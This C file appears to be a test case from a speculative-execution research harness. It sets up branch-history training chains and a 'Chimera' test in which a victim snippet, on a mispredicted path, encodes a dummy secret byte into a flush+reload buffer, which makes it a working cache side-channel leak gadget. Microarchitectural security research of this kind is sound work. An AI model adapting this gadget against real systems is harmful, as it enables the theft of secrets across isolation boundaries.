#include "tests.h"

uint64_t *bh_args;
char dummy_secret_invalid = 0;

__attribute__((aligned(4096))) uint64_t arg_array[32*SIZE_CACHE_STRIDE];

static uint64_t *argv_train_p2[4] = {
    &arg_array[2*SIZE_CACHE_STRIDE], 
    &arg_array[3*SIZE_CACHE_STRIDE], 
    &arg_array[4*SIZE_CACHE_STRIDE], 
    &arg_array[5*SIZE_CACHE_STRIDE]
};

static uint64_t *argv_train_p1[4] = {
    &arg_array[12*SIZE_CACHE_STRIDE], 
    &arg_array[13*SIZE_CACHE_STRIDE], 
    &arg_array[14*SIZE_CACHE_STRIDE], 
    &arg_array[15*SIZE_CACHE_STRIDE]
};

static uint64_t *argv_test[4] = {
    &arg_array[22*SIZE_CACHE_STRIDE], 
    &arg_array[23*SIZE_CACHE_STRIDE], 
    &arg_array[24*SIZE_CACHE_STRIDE], 
    &arg_array[25*SIZE_CACHE_STRIDE]
};

static void *bhs_dc_flush[1] = {&arg_array[22*SIZE_CACHE_STRIDE]};
struct argp_child argp_child_test[] = {0};

static bh_chain_params_t chain_train_p2 = {
    .bh_tramp_p = &tramp_bcond,
    .ib_target = &t_alt,
    .bh_args_p = &bh_args,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .nr_bh_for_p = &args.nr_for_bh,
    .ib_ptr_p = IBPTR,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P,
    .ex_argc = 1,
    .ex_argv = (char **)&argv_train_p2
};

static bh_chain_params_t chain_train_p1 = {
    .bh_tramp_p = &tramp_bcond,
    .ib_target = &t_leak,
    .bh_args_p = &bh_args,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .nr_bh_for_p = &args.nr_for_bh,
    .ib_ptr_p = IBPTR,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P,
    .ex_argc = 1,
    .ex_argv = (char **)&argv_train_p1
};

static bh_chain_params_t chain_test = {
    .bh_tramp_p = &tramp_bcond,
    .ib_target = &t_empty,
    .bh_args_p = &bh_args,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .nr_bh_for_p = &args.nr_for_bh,
    .ib_ptr_p = IBPTR,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P,
    .ex_argc = 1,
    .ex_argv = (char **)&argv_test
};

test_obj_t test_chimera = {
    .nr_repeat = NR_TEST_ITER,
    .nr_train_passes = 4,
    .nr_train_chains = 2,
    .train_chains = (bh_chain_params_t *[]){&chain_train_p2, &chain_train_p1},
    .spec_chain = &chain_test,
    .nr_dc_flush = 1,
    .dc_flush = (void **)bhs_dc_flush,
    .pre_train = &t_empty,
    .pre_spec = &t_empty,
    .nr_probes = 1,
    .probes_p = (char *[]){DUMMY_SECRET_P},
    .description = "Chimera"
};

run_obj_t run = {
    .nr_tests = 1,
    .bp_snippet = &asm_bhs_br_obj,
    .tests = {&test_chimera},
};

uint64_t test_continue = true;
bool next_run()
{
    bool ret = test_continue;
    test_continue &= false;
    return ret;
}

void victim_snippet(uint64_t *offsets, uint64_t idx, char** argv, void **ib_ptr_p, char *frbuf, uint8_t *secret_p)
{
    register uint64_t frbuf_offset = 0;
    register uint64_t _c = *argv[2];
    register uint64_t _a=(uint64_t)argv[0], _b=(uint64_t)argv[1], _d=(uint64_t)argv[3];
    OPS_BARRIER(0x40);
    // load flags into registers
    _a=*(uint64_t*)_a;
    _b=*(uint64_t*)_b;
    _d=*(uint64_t*)_d;

    // PART 1 ==================
    if (_d==0)
    {
        if (_a==0)
        {
            frbuf_offset = (*secret_p)*SIZE_CACHE_STRIDE;
            NOP(8);
        }
        if (_a==0 & _b==0)
        {
            NOP(8);
            return;
        }
        NOP(8);
        if (_c==0)
    // PART 2 ==================
        {
            NOP(8);
        }
    }
    NOP(8);
    if (_b!=0)
    {
        NOP(8);
        return;
    }
    NOP(8);
    if (_a!=0)
    {
        MEM_ACCESS(&frbuf[frbuf_offset]);
        NOP(8);
    }
}

void init_test_bh_chains()
{
    // For training part 2
    *argv_train_p2[0] = 1;
    *argv_train_p2[1] = 0;
    *argv_train_p2[2] = 0;
    *argv_train_p2[3] = 1;

    // For training part 1
    *argv_train_p1[0] = 0;
    *argv_train_p1[1] = 1;
    *argv_train_p1[2] = 0;
    *argv_train_p1[3] = 0;

    // For testing
    *argv_test[0] = 0;
    *argv_test[1] = 0;
    *argv_test[2] = 1;
    *argv_test[3] = 0;

    bh_args = malloc((args.nr_cond_bh + 1) * sizeof(uint64_t));
    for (int i = 0; i < (args.nr_cond_bh + 1); i++)
        bh_args[i] = i%2;
    bh_args[args.nr_cond_bh] = (uint64_t)(&victim_snippet);
}

void free_test_bh_chains()
{
    free(bh_args);
}

void init_test()
{
    init_test_bh_chains();
}

void free_test()
{
    free_test_bh_chains();
}